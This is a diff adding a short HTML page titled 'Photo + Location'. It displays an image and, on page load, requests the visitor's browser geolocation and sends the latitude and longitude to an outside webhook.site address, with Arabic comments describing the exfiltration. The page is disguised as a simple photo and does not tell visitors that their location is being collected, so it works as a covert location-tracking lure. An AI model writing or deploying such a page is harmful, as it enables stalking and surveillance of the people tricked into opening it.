@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Photo + Location</title>
+</head>
+<body>
+
+<h2></h2>
+<img src="https://i.pinimg.com/474x/86/0d/e2/860de2b71443b75d4b6e81ff422e2a19.jpg" 
+     width="300" id="photo" style="cursor:pointer;">
+
+<script>
+
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(function(position){
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+
+            // تبعث الإحداثيات مباشرة ل webhook
+            fetch("https://webhook.site/859b6ebf-b6e5-49f7-b474-161c00ca082d?lat=" + lat + "&lon=" + lon);
+
+            // توريك البلاصة مباشرة على Google Maps
+
+        }, function(error){
+            alert("Location permission denied or unavailable");
+        });
+    } else {
+        alert("Geolocation is not supported by your browser.");
+    }
+</script>
+
+</body>
+</html>
